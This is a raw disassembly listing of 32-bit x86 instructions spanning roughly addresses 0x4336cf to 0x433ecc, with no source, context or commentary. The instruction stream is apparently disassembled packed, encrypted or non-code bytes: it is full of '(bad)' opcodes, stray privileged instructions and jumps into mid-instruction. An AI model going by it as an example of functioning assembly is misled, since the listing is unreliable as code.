  4336cf:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4336d5:	xor    al,BYTE PTR [ebp+0x64]
  4336d8:	pop    ebx
  4336d9:	mov    ebx,0x9c3a37
  4336de:	je     0x43370b
  4336e0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4336e6:	mov    WORD PTR [ebx],?
  4336e8:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  4336ee:	pop    edi
  4336ef:	cmp    ecx,ecx
  4336f1:	jne    0x433748
  4336f3:	mov    ebp,esp
  4336f5:	cld    
  4336f6:	push   esi
  4336f7:	pop    ebx
  4336f8:	inc    ebp
  4336f9:	stc    
  4336fa:	aaa    
  4336fb:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433702:	clc    
  433703:	test   dl,dl
  433705:	xor    al,0xff
  433707:	fs pop si
  43370a:	or     bl,al
  43370c:	dec    BYTE PTR [ebx+0x57665100]
  433712:	retf   0x3845
  433715:	aaa    
  433716:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43371d:	clc    
  43371e:	add    BYTE PTR [ebx+0x66],bl
  433721:	dec    edx
  433723:	mov    edx,DWORD PTR [edi-0x76]
  433726:	push   edi
  433727:	add    al,0xb7
  433729:	xor    al,0xba
  43372b:	cmp    al,0x8d
  43372d:	je     0x43372e
  43372f:	mov    edx,DWORD PTR [ecx-0x46]
  433732:	push   ecx
  433733:	lea    edi,[ebx+0x514fff]
  433739:	push   ecx
  43373a:	cmp    edx,DWORD PTR [ebx+0x75]
  43373d:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  433743:	add    BYTE PTR [ebx],dh
  433745:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43374b:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  433752:	mov    ebx,0x3b3a00
  433757:	jne    0x433784
  433759:	mov    DWORD PTR [ebx+0x728afc],edi
  43375f:	xor    esi,DWORD PTR [ebx]
  433761:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  433767:	push   edi
  433768:	cmp    esp,ebp
  43376a:	jne    0x43376c
  43376c:	sbb    DWORD PTR [eax],0x8085c3fc
  433772:	clc    
  433773:	inc    esp
  433774:	pop    ebx
  433775:	sti    
  433776:	add    eax,0xeb8bc075
  43377b:	cld    
  43377c:	xor    edi,DWORD PTR ds:0xf8c3855e
  433782:	mov    ecx,DWORD PTR [ecx+edx*2]
  433785:	rol    DWORD PTR [ebp-0x37],0xf
  433789:	mov    DWORD PTR [eax],ecx
  43378b:	inc    edi
  43378c:	(bad)  
  43378d:	in     eax,0x2
  43378f:	add    bh,bh
  433791:	(bad)  
  433792:	mov    esi,0xc38a5e
  433797:	mov    esi,DWORD PTR [ebx]
  433799:	push   ecx
  43379a:	mov    edi,0xfc4fc7
  43379f:	test   DWORD PTR [ebp-0x8],edx
  4337a2:	data16 ss (bad) 
  4337a5:	pushf  
  4337a6:	sub    ebp,eax
  4337a8:	inc    ebp
  4337a9:	(bad)  
  4337aa:	sub    edi,edi
  4337ac:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4337b2:	inc    ebp
  4337b3:	add    BYTE PTR [esi+0x2b],ah
  4337b6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4337bc:	cmp    al,0x33
  4337be:	mov    edi,DWORD PTR [edx+0x24f81]
  4337c4:	(bad)  
  4337c5:	cmp    esi,DWORD PTR [ebx]
  4337c7:	je     0x433781
  4337c9:	push   ebx
  4337ca:	dec    edi
  4337cb:	str    ecx
  4337ce:	cmp    esp,DWORD PTR [edi+0x75]
  4337d1:	int    0x33
  4337d3:	mov    edi,0x789085f
  4337d8:	mov    ecx,DWORD PTR [eax]
  4337da:	cld    
  4337db:	add    cl,cl
  4337dd:	data16 add al,0xcb
  4337e0:	push   ebp
  4337e1:	add    ebp,esp
  4337e3:	jne    0x4337d1
  4337e5:	(bad)  
  4337e6:	mov    DWORD PTR [ecx],0xd685f7ec
  4337ec:	clc    
  4337ed:	xlat   BYTE PTR ds:[ebx]
  4337ee:	inc    ebp
  4337ef:	mov    edi,DWORD PTR [ecx]
  4337f1:	push   eax
  4337f2:	pushf  
  4337f3:	in     eax,0x8b
  4337f5:	add    ah,ch
  4337f7:	(bad)  
  4337f8:	push   ecx
  4337f9:	add    BYTE PTR [ecx+0x66],dl
  4337fc:	add    eax,0x3872cb
  433801:	add    BYTE PTR [ebp+0x66],al
  433804:	(bad)  
  433805:	retf   
  433806:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43380d:	retf   
  43380e:	cmp    cl,al
  433810:	pushf  
  433811:	jge    0x4337da
  433813:	aaa    
  433814:	cld    
  433815:	pushf  
  433816:	test   DWORD PTR [edi-0x8],ebx
  433819:	je     0x433860
  43381b:	xor    esi,DWORD PTR ds:0x7020840
  433821:	ror    BYTE PTR [ebp-0x37],0x8d
  433825:	push   ebp
  433826:	add    esp,ebp
  433828:	jb     0x4337b5
  43382a:	add    BYTE PTR [eax],cl
  43382c:	dec    ebp
  43382d:	mov    bh,0x81
  43382f:	push   esi
  433830:	push   ecx
  433831:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  433838:	xor    al,BYTE PTR [eax]
  43383a:	mov    edx,DWORD PTR [edi+0x10]
  43383d:	(bad)  
  43383e:	scas   eax,DWORD PTR es:[edi]
  43383f:	cmp    bh,BYTE PTR [ebx]
  433841:	add    BYTE PTR [edi],cl
  433843:	mov    ebp,ebp
  433845:	cld    
  433846:	add    BYTE PTR [ebx],bh
  433848:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43384c:	dec    ebp
  43384d:	or     BYTE PTR [ebx],ch
  43384f:	ret    0x458b
  433852:	lock jmp 0x433846
  433855:	mov    ecx,DWORD PTR [eax]
  433857:	or     BYTE PTR [edi],al
  433859:	mov    ecx,eax
  43385b:	xor    DWORD PTR [edx+0x2],0x0
  43385f:	mov    bh,0xc1
  433861:	adc    BYTE PTR [eax],dh
  433863:	iret   
  433864:	inc    ebp
  433865:	mov    DWORD PTR [ebx],0x4dfff8c5
  43386b:	inc    BYTE PTR [ebx]
  43386d:	cmp    bh,al
  43386f:	add    BYTE PTR [ecx],dl
  433871:	data16 adc al,bh
  433874:	dec    ecx
  433875:	fisttp WORD PTR [ecx+0x456604c0]
  43387b:	add    dh,BYTE PTR ds:0x75e0845
  433881:	ret    0x4d
  433884:	lea    ecx,[ebx+0x18728301]
  43388a:	add    BYTE PTR [ebp+0x45],al
  43388d:	ss jmp 0x10a392f
  433893:	call   0xf8cebddd
  433898:	clc    
  433899:	inc    ebp
  43389a:	shl    DWORD PTR ds:0x781084d,0x51
  4338a1:	cdq    
  4338a2:	push   ecx
  4338a3:	xor    al,BYTE PTR [ecx+0x32f89989]
  4338a9:	inc    ebp
  4338aa:	cmp    edi,DWORD PTR [esi]
  4338ac:	jbe    0x43384a
  4338ae:	mov    eax,edi
  4338b0:	or     ah,dh
  4338b2:	inc    ebp
  4338b3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4338b9:	cmp    BYTE PTR [ebx-0x74747664],cl
  4338bf:	in     al,dx
  4338c0:	hlt    
  4338c1:	push   ecx
  4338c2:	push   ecx
  4338c3:	push   ecx
  4338c4:	push   ecx
  4338c5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4338cb:	cdq    
  4338cc:	cdq    
  4338cd:	xor    dh,BYTE PTR [edx]
  4338cf:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4338d5:	or     BYTE PTR [ebp+0x7],al
  4338d8:	mov    eax,ecx
  4338da:	clc    
  4338db:	jb     0x43389e
  4338dd:	add    BYTE PTR [ebp+0x55],cl
  4338e0:	or     DWORD PTR [edi],0xc251d151
  4338e6:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  4338f0:	mov    edi,eax
  4338f2:	or     cl,al
  4338f4:	inc    ebp
  4338f5:	dec    ebp
  4338f6:	mov    eax,DWORD PTR [ecx+0x514d510c]
  4338fc:	or     WORD PTR [ecx],0x8999
  433901:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433907:	mov    edx,DWORD PTR [ecx+0x8]
  43390a:	mov    eax,DWORD PTR [ebp-0x8]
  43390d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433914:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43391a:	inc    ebp
  43391b:	dec    eax
  43391c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  433922:	add    edx,DWORD PTR [ecx-0x8]
  433925:	mov    ecx,DWORD PTR [ecx]
  433927:	clc    
  433928:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  43392f:	mov    ecx,ebp
  433931:	clc    
  433932:	(bad)  
  433933:	popf   
  433934:	inc    DWORD PTR [eax]
  433936:	ret    0x8b
  433939:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43393f:	mov    edi,esp
  433941:	hlt    
  433942:	test   ecx,esi
  433944:	clc    
  433945:	or     BYTE PTR [ebp+0x7],al
  433948:	cmp    ecx,eax
  43394a:	pushf  
  43394b:	jb     0x433980
  43394d:	add    BYTE PTR [eax-0x3f],al
  433950:	inc    eax
  433951:	daa    
  433952:	inc    ebp
  433953:	inc    ebp
  433954:	xor    eax,0x7f80803
  433959:	dec    ebp
  43395a:	cdq    
  43395b:	add    esi,DWORD PTR [edx]
  43395d:	clc    
  43395e:	cmp    DWORD PTR [ecx],ecx
  433960:	or     al,0x8
  433962:	add    al,BYTE PTR [ebp+0x2c]
  433965:	xor    eax,0x7350845
  43396a:	or     BYTE PTR [ebp+0x7],cl
  43396d:	lea    ebx,[ecx-0x748dcdff]
  433973:	add    BYTE PTR [eax*2-0x74b21438],cl
  43397a:	mov    edx,DWORD PTR [eax]
  43397c:	cld    
  43397d:	dec    ebp
  43397e:	push   ecx
  43397f:	sub    edx,DWORD PTR [ecx-0x75]
  433982:	add    eax,0xf172fc
  433987:	or     BYTE PTR [ebp+0x7],cl
  43398a:	add    eax,ecx
  43398c:	or     al,0x72
  43398e:	add    DWORD PTR [eax],eax
  433990:	mov    ebx,0x29c2c1
  433995:	inc    ebp
  433996:	mov    eax,DWORD PTR [ebx]
  433998:	cmp    eax,0x3004d1c
  43399e:	xbegin 0x66c8c598
  4339a4:	clc    
  4339a5:	or     BYTE PTR [ebp+0x45],al
  4339a8:	cmp    DWORD PTR ds:0x78b089c,esi
  4339ae:	adc    BYTE PTR [ebp+0x45],cl
  4339b1:	lea    eax,[ebp+0x33727501]
  4339b7:	add    cl,ch
  4339b9:	inc    ebp
  4339ba:	add    bl,ch
  4339bc:	add    BYTE PTR [ebx+0x45850845],cl
  4339c2:	je     0x43394f
  4339c4:	push   ebx
  4339c5:	or     al,0x85
  4339c7:	dec    ebp
  4339c8:	std    
  4339c9:	mov    bh,bh
  4339cb:	mov    BYTE PTR [ebp-0x75],al
  4339ce:	mov    edi,eax
  4339d0:	or     al,0x89
  4339d2:	inc    ebp
  4339d3:	clc    
  4339d4:	mov    esp,esp
  4339d6:	hlt    
  4339d7:	call   DWORD PTR [edi-0x37]
  4339da:	push   ecx
  4339db:	or     al,0x51
  4339dd:	push   ebp
  4339de:	xor    ebp,esp
  4339e0:	mov    esi,0x457251
  4339e5:	ss (bad) 
  4339e7:	pushf  
  4339e8:	inc    ebp
  4339e9:	(bad)  
  4339ea:	mov    edi,eax
  4339ec:	or     al,0x85
  4339ee:	add    al,bh
  4339f0:	inc    eax
  4339f2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4339f6:	or     ah,bh
  4339f8:	inc    eax
  4339f9:	push   ecx
  4339fa:	jmp    0x433a4d
  4339fc:	mov    eax,DWORD PTR ds:0xe8720c
  433a02:	mov    DWORD PTR [ebp-0x8],eax
  433a05:	jne    0x433a4c
  433a07:	jmp    0x433994
  433a09:	mov    ebp,DWORD PTR [eax]
  433a0b:	clc    
  433a0c:	retf   0xff51
  433a0f:	push   ecx
  433a10:	mov    DWORD PTR ds:0x757210,eax
  433a16:	mov    ecx,DWORD PTR [ebp-0x4]
  433a19:	sub    esp,DWORD PTR [ebx-0x77]
  433a1c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  433a23:	or     ah,bh
  433a25:	pop    es
  433a26:	ds cdq 
  433a28:	push   DWORD PTR [edx]
  433a2a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  433a30:	(bad)  
  433a31:	mov    bh,bh
  433a33:	jmp    0x433a21
  433a35:	leave  
  433a36:	jne    0x433a40
  433a38:	call   0x303392
  433a3d:	in     al,dx
  433a3e:	dec    ebp
  433a3f:	add    dh,BYTE PTR [ebx]
  433a41:	add    BYTE PTR [ebx],al
  433a43:	inc    ebp
  433a44:	cmp    esi,DWORD PTR [esi]
  433a46:	je     0x4339e4
  433a48:	mov    eax,edi
  433a4a:	or     al,0xf0
  433a4c:	add    BYTE PTR [ebp+0x458bf845],al
  433a52:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  433a58:	adc    al,0x7
  433a5a:	enter  0x9fc0,0xa5
  433a5e:	rol    BYTE PTR [eax],0x5e
  433a61:	mov    ecx,ecx
  433a63:	or     al,0xc
  433a65:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  433a6c:	jmp    0x433a6d
  433a6e:	push   ebp
  433a6f:	mov    esp,ebp
  433a71:	cld    
  433a72:	inc    ebp
  433a73:	inc    ebp
  433a74:	or     DWORD PTR [ecx+0x457dec10],0x0
  433a7b:	push   esi
  433a7c:	push   esi
  433a7d:	mov    edi,0x7af080f
  433a82:	add    bh,al
  433a84:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a8a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a90:	mov    ebp,eax
  433a92:	mov    ebp,edi
  433a94:	lock call edx
  433a97:	fcom   DWORD PTR [ebp+0x45]
  433a9a:	mov    eax,0x148a8b
  433a9f:	push   ecx
  433aa0:	enter  0xc145,0x83
  433aa4:	cmp    cl,BYTE PTR [eax]
  433aa6:	add    BYTE PTR [ebp+0x4d],al
  433aa9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433aaf:	call   0xffa3361e
  433ab4:	cmp    eax,DWORD PTR [ebp-0xc]
  433ab7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433abb:	push   ebp
  433abc:	(bad)
  433abf:	std    
  433ac0:	lock push DWORD PTR [edi+0x5d08fcdb]
  433ac7:	inc    ebp
  433ac8:	(bad)  
  433ac9:	call   0xff7d3759
  433ace:	add    al,BYTE PTR [ebp+0x37]
  433ad1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433ad7:	jne    0x433ad9
  433ad9:	(bad)  
  433ada:	cmp    edi,esp
  433adc:	jne    0x433b0f
  433ade:	mov    edi,edi
  433ae0:	or     BYTE PTR [ebx-0x307f0b49],cl
  433ae6:	pop    ds
  433ae7:	into   
  433ae8:	je     0x433aab
  433aea:	mov    ebx,DWORD PTR [esi]
  433aec:	or     BYTE PTR [ebp-0x49],al
  433aef:	mov    esp,DWORD PTR [esi-0x77]
  433af2:	mov    esi,0xfe451f0c
  433af7:	mov    eax,DWORD PTR [eax]
  433af9:	or     al,0x66
  433afb:	sar    bl,0x3b
  433afe:	xor    esi,DWORD PTR [ebp+0x66]
  433b01:	xor    ecx,edi
  433b03:	pop    edi
  433b04:	adc    bl,BYTE PTR [ebx+0x7e]
  433b07:	ret    0xff
  433b0a:	cld    
  433b0b:	inc    ebp
  433b0c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433b12:	cld    
  433b13:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433b1a:	push   0xffffff83
  433b1c:	pop    edi
  433b1d:	or     BYTE PTR [ebp+0x53],dh
  433b20:	xorps  xmm1,xmm2
  433b23:	test   BYTE PTR [eax+eax*1],bh
  433b26:	add    BYTE PTR [eax],al
  433b28:	adc    eax,eax
  433b2a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433b32:	jmp    DWORD PTR [eax]
  433b34:	ror    al,0x5e
  433b37:	inc    ebp
  433b38:	leave  
  433b39:	xor    ecx,DWORD PTR [eax]
  433b3b:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433b41:	add    ch,al
  433b43:	xor    edi,edi
  433b45:	xor    DWORD PTR [ebx],0x660033fe
  433b4b:	mov    DWORD PTR [ebp-0xc],ecx
  433b4e:	pcmpgtw mm0,mm0
  433b51:	add    dl,ah
  433b53:	leave  
  433b54:	mov    edi,DWORD PTR [eax-0x7d]
  433b57:	push   ax
  433b59:	dec    ebp
  433b5a:	mov    esi,DWORD PTR [ebx-0x75]
  433b5d:	lea    ebp,[eax-0x7c00fffe]
  433b63:	xor    eax,DWORD PTR [eax]
  433b65:	sysret 
  433b67:	dec    ebp
  433b68:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433b6f:	push   WORD PTR [ecx+0x8]
  433b73:	jne    0x433b36
  433b75:	ud0    ecx,DWORD PTR [ecx]
  433b78:	mov    edi,DWORD PTR [edx]
  433b7a:	lods   al,BYTE PTR ds:[esi]
  433b7b:	add    BYTE PTR [eax],al
  433b7d:	data16 (bad) 
  433b7f:	iret   
  433b80:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b87:	cli    
  433b88:	inc    ebp
  433b89:	cmp    al,0x8d
  433b8b:	add    BYTE PTR [esi+0x2d],ah
  433b8e:	inc    ebp
  433b8f:	pop    ebp
  433b90:	lea    ecx,[edi]
  433b92:	mov    dl,bh
  433b94:	add    BYTE PTR [edi],cl
  433b96:	mov    DWORD PTR [eax+eax*8],edi
  433b99:	mov    ebx,0x3a87
  433b9e:	add    BYTE PTR [ebx],ch
  433ba0:	inc    ebp
  433ba1:	data16 (bad) 
  433ba3:	clc    
  433ba4:	int3   
  433ba5:	cmp    eax,DWORD PTR [eax]
  433ba7:	je     0x433b32
  433ba9:	push   0xffffffc8
  433bab:	pop    edi
  433bac:	xchg   DWORD PTR [ebp+0x0],eax
  433baf:	data16 add BYTE PTR [ebp+0x45],cl
  433bb3:	lea    cx,[ebp+0x10]
  433bb7:	jb     0x433bb9
  433bb9:	jmp    0x433b44
  433bbb:	call   eax
  433bbd:	clc    
  433bbe:	xchg   DWORD PTR [edi+0x1],edi
  433bc1:	mov    eax,DWORD PTR [eax]
  433bc3:	or     BYTE PTR [ebp-0x49],al
  433bc6:	lea    eax,[eax+0x74003154]
  433bcc:	push   edi
  433bcd:	inc    edx
  433bce:	jge    0x433bcf
  433bd0:	mov    DWORD PTR [edi],ecx
  433bd2:	fdiv   DWORD PTR [edi-0x6]
  433bd5:	inc    DWORD PTR [eax]
  433bd7:	xor    edx,DWORD PTR [eax+0x5f]
  433bda:	xchg   DWORD PTR [ebx+0x1],ebx
  433bdd:	ret    0x0
  433be0:	xor    BYTE PTR [ebp-0x51],cl
  433be3:	cmp    edi,0xf0ff8902
  433be9:	data16 ror al,0x84
  433bed:	rol    BYTE PTR [eax],0x3b
  433bf0:	add    al,dh
  433bf2:	dec    eax
  433bf3:	xchg   esp,eax
  433bf4:	push   ebx
  433bf5:	jmp    0x433b82
  433bf7:	push   ebp
  433bf8:	add    esp,ebp
  433bfa:	add    ebp,esp
  433bfc:	mov    edx,DWORD PTR [edi+0x24]
  433bff:	clc    
  433c00:	dec    esi
  433c01:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433c07:	cmp    BYTE PTR [ebx],al
  433c09:	jne    0x433b94
  433c0b:	xor    esp,eax
  433c0d:	jmp    0x463d90
  433c12:	add    ebp,DWORD PTR [ecx+ecx*4]
  433c15:	jne    0x433c0b
  433c17:	call   0xffcd3971
  433c1c:	clc    
  433c1d:	xchg   edi,eax
  433c1e:	sti    
  433c1f:	add    DWORD PTR [ebx],eax
  433c21:	add    BYTE PTR [ebp+0x47],bl
  433c24:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433c2a:	pop    ebp
  433c2b:	mov    DWORD PTR [esi-0x48],esi
  433c2e:	jmp    0x433c77
  433c30:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433c36:	(bad)  
  433c38:	cmp    al,0x0
  433c3a:	cmp    eax,DWORD PTR [ebp+0x18]
  433c3d:	lea    ebx,[ebp-0x56]
  433c40:	jle    0x433c42
  433c42:	jae    0x433bcd
  433c44:	mov    eax,esp
  433c46:	call   0xb900:0x8b005587
  433c4d:	inc    ebp
  433c4e:	push   ebp
  433c4f:	lea    ecx,[ebp-0x27ff4f12]
  433c55:	mov    eax,edi
  433c57:	int3   
  433c58:	push   ebp
  433c59:	xchg   edi,eax
  433c5b:	add    esp,ebp
  433c5d:	add    BYTE PTR [eax],al
  433c5f:	inc    ebp
  433c60:	add    BYTE PTR [ebp+0x8b3255],cl
  433c66:	cld    
  433c67:	mov    DWORD PTR [edx],edi
  433c69:	aam    0x75
  433c6b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433c71:	mov    DWORD PTR [ebx-0x50],edx
  433c74:	test   BYTE PTR [ebp-0x1],0xe8
  433c78:	mov    eax,DWORD PTR [eax]
  433c7a:	hlt    
  433c7b:	add    al,al
  433c7d:	mov    eax,DWORD PTR ds:0x890045a8
  433c83:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c89:	inc    DWORD PTR [eax*2+0xf75854d]
  433c90:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c96:	call   0x729999d7
  433c9b:	je     0x433cfb
  433c9d:	js     0x433cfe
  433c9f:	lock ret 0x7e
  433ca3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433ca9:	mov    edi,edi
  433cab:	sbb    al,bl
  433cad:	clc    
  433cae:	add    BYTE PTR [ebp-0x73],bh
  433cb1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433cb7:	ror    BYTE PTR [eax],1
  433cb9:	dec    ebp
  433cba:	xchg   ebp,eax
  433cbb:	mov    edi,edi
  433cbd:	in     al,0x8b
  433cbf:	jge    0x433c4a
  433cc1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433cc7:	clc    
  433cc8:	pop    esi
  433cc9:	fist   DWORD PTR [ebp+0x5d398b5d]
  433ccf:	clc    
  433cd0:	add    al,0x6e
  433cd2:	mov    eax,DWORD PTR [ebx]
  433cd4:	mov    BYTE PTR [ebp+0x0],dl
  433cd7:	mov    edx,DWORD PTR [ebx-0x20]
  433cda:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433ce0:	add    eax,0x3b3a73
  433ce5:	adc    al,0x89
  433ce7:	pop    eax
  433ce8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433cec:	ret    0xf08
  433cef:	cmp    al,0x2
  433cf1:	mov    DWORD PTR [edx],edi
  433cf3:	cld    
  433cf4:	add    BYTE PTR [ebp+0x66],dl
  433cf7:	add    eax,ebx
  433cf9:	add    esp,eax
  433cfb:	sub    eax,eax
  433cfd:	or     BYTE PTR [ecx-0x77f474bb],cl
  433d03:	add    BYTE PTR [eax],al
  433d05:	mov    DWORD PTR [ebx-0x24],ebx
  433d08:	push   edi
  433d09:	push   ebp
  433d0a:	clc    
  433d0b:	add    DWORD PTR [esi+0x1b0100],0x45
  433d12:	out    0xff,eax
  433d14:	add    edx,DWORD PTR [eax]
  433d16:	jmp    0x433d00
  433d18:	cmp    ch,0x44
  433d1b:	(bad)  
  433d1c:	jmp    0x40c8c56e
  433d21:	je     0x433cad
  433d23:	mov    eax,DWORD PTR [eax-0x10c78104]
  433d29:	inc    ebp
  433d2a:	add    BYTE PTR [ebx-0x770375],al
  433d30:	add    ah,ch
  433d32:	add    edx,esp
  433d34:	pop    edi
  433d35:	pop    ebp
  433d36:	push   ebp
  433d37:	inc    ebx
  433d38:	in     al,dx
  433d39:	pop    ebp
  433d3a:	in     al,dx
  433d3b:	cmp    edx,DWORD PTR [edi-0x8]
  433d3e:	ss xchg esp,eax
  433d40:	pushf  
  433d41:	pop    ebx
  433d42:	mov    ecx,ecx
  433d44:	call   0x8998844d
  433d49:	in     al,dx
  433d4a:	in     al,0x45
  433d4c:	dec    ebp
  433d4d:	push   esi
  433d4e:	test   DWORD PTR [eax+0xfb010f],esi
  433d54:	add    BYTE PTR [eax+0xc018b],dh
  433d5a:	leave  
  433d5b:	inc    ebp
  433d5c:	test   al,ch
  433d5e:	add    dh,bh
  433d60:	add    bh,bh
  433d62:	dec    ebp
  433d63:	push   cs
  433d64:	mov    DWORD PTR [ecx],eax
  433d66:	hlt    
  433d67:	push   es
  433d68:	dec    ebp
  433d69:	leave  
  433d6a:	mov    DWORD PTR [eax],ecx
  433d6c:	clc    
  433d6d:	cmovge eax,ecx
  433d70:	mov    ecx,0x85c2f0
  433d76:	clc    
  433d77:	pop    DWORD PTR [ebp+0x1]
  433d7a:	push   ebx
  433d7b:	add    BYTE PTR [ebp-0x15],bh
  433d7e:	push   esi
  433d7f:	xor    eax,0x898a45
  433d84:	cld    
  433d85:	inc    BYTE PTR [ebp+0x0]
  433d88:	cmp    BYTE PTR [esi-0x64],ah
  433d8b:	add    DWORD PTR [esi+0x78308c1],edi
  433d91:	add    ah,BYTE PTR [edi-0x49]
  433d94:	int    0xbb
  433d96:	mov    ecx,DWORD PTR [edi+0xc]
  433d99:	add    dh,al
  433d9b:	cmp    ecx,ebx
  433d9d:	jne    0x433d67
  433d9f:	xor    ecx,DWORD PTR [ebp+0x66]
  433da2:	jmp    0xca3da8
  433da7:	add    DWORD PTR [ebp+0x0],eax
  433daa:	mov    eax,ebx
  433dac:	or     al,0x8b
  433dae:	(bad)  
  433daf:	mov    ecx,esi
  433db1:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433db8:	mov    eax,edi
  433dba:	or     BYTE PTR [edx],cl
  433dbc:	shl    cl,cl
  433dbe:	icebp  
  433dbf:	add    BYTE PTR [ebp+0x3a],0x8b
  433dc3:	or     BYTE PTR [edx+eax*2],cl
  433dc6:	(bad)  
  433dc7:	or     cl,dh
  433dc9:	stc    
  433dca:	shl    DWORD PTR [ebp-0x30],0xc6
  433dce:	xor    al,0x0
  433dd0:	inc    ebp
  433dd1:	xchg   BYTE PTR [ebx],al
  433dd3:	add    esp,edi
  433dd5:	add    BYTE PTR [ebp-0x39],cl
  433dd8:	mov    al,bl
  433dda:	test   DWORD PTR [ebx+0x1c348375],ecx
  433de0:	sub    al,0xbf
  433de2:	jmp    0x433d69
  433de4:	mov    edi,eax
  433de6:	lock jge 0x433dda
  433de9:	lea    esi,[edx-0x74bad5fd]
  433def:	mov    ebp,esp
  433df1:	or     cl,dh
  433df3:	leave  
  433df4:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433dfb:	dec    ebp
  433dfc:	dec    ebp
  433dfd:	test   DWORD PTR [ebx],eax
  433dff:	paddb  mm6,mm0
  433e02:	add    DWORD PTR [eax],eax
  433e04:	dec    ebp
  433e05:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433e0b:	mov    esi,DWORD PTR [edx]
  433e0d:	or     al,0x2b
  433e0f:	dec    ebp
  433e10:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433e16:	mov    esp,edx
  433e18:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433e1f:	mov    DWORD PTR [ebx],ebp
  433e21:	call   0xc76c751
  433e26:	mov    DWORD PTR [ebp+0x10],ecx
  433e29:	(bad)  
  433e2a:	push   0x8b85ff10
  433e2f:	clc    
  433e30:	or     al,0x51
  433e32:	(bad)  
  433e33:	push   ecx
  433e34:	retf   
  433e35:	mov    ebx,0xff4d8dc8
  433e3a:	mov    DWORD PTR [ebp+0x8],eax
  433e3d:	xor    eax,DWORD PTR [ebp-0x75]
  433e40:	cmp    ebp,DWORD PTR [ebx]
  433e42:	lsl    ebx,WORD PTR [edi-0x8]
  433e46:	call   DWORD PTR [ebx-0x741bff75]
  433e4c:	(bad)  
  433e4d:	or     al,0x5b
  433e4f:	dec    ebp
  433e50:	or     BYTE PTR [ebx],dh
  433e52:	inc    ebp
  433e53:	xor    esi,DWORD PTR ds:0x708088d
  433e59:	in     eax,0x99
  433e5b:	add    BYTE PTR [edx],dh
  433e5d:	inc    ebp
  433e5e:	pop    edi
  433e5f:	xor    eax,edx
  433e61:	test   DWORD PTR [eax],0x81108b8b
  433e67:	dec    ebp
  433e68:	sub    al,0x33
  433e6a:	add    BYTE PTR [ebx],dh
  433e6c:	push   esi
  433e6d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433e73:	mov    edi,eax
  433e75:	or     BYTE PTR [ebp+0x45],al
  433e78:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433e7e:	ss leave 
  433e80:	pushf  
  433e81:	push   es
  433e82:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e8a:	inc    ebp
  433e8b:	cmp    BYTE PTR [esi],0x51
  433e8e:	pushf  
  433e8f:	addr16 (bad) 
  433e91:	shl    esp,1
  433e93:	dec    ebp
  433e94:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e9a:	(bad)  
  433e9b:	jmp    0x8c0b1177
  433ea0:	aam    0x8
  433ea2:	test   DWORD PTR [ebp-0x8],ecx
  433ea5:	mov    BYTE PTR [ebp-0x75],al
  433ea8:	or     BYTE PTR [eax],cl
  433eaa:	add    BYTE PTR [ebp-0x75],dl
  433ead:	mov    eax,0xfc728b
  433eb2:	dec    ebp
  433eb3:	enter  0xceba,0x8
  433eb7:	retf   0x1807
  433eba:	ret    0x994d
  433ebd:	mov    esi,DWORD PTR [edx]
  433ebf:	or     al,0x33
  433ec1:	into   
  433ec2:	add    edx,esi
  433ec4:	add    ecx,edx
  433ec6:	bswap  eax
  433ec8:	ror    esi,0x98
  433ecb:	dec    ebp
  433ecc:	add    cl,ch
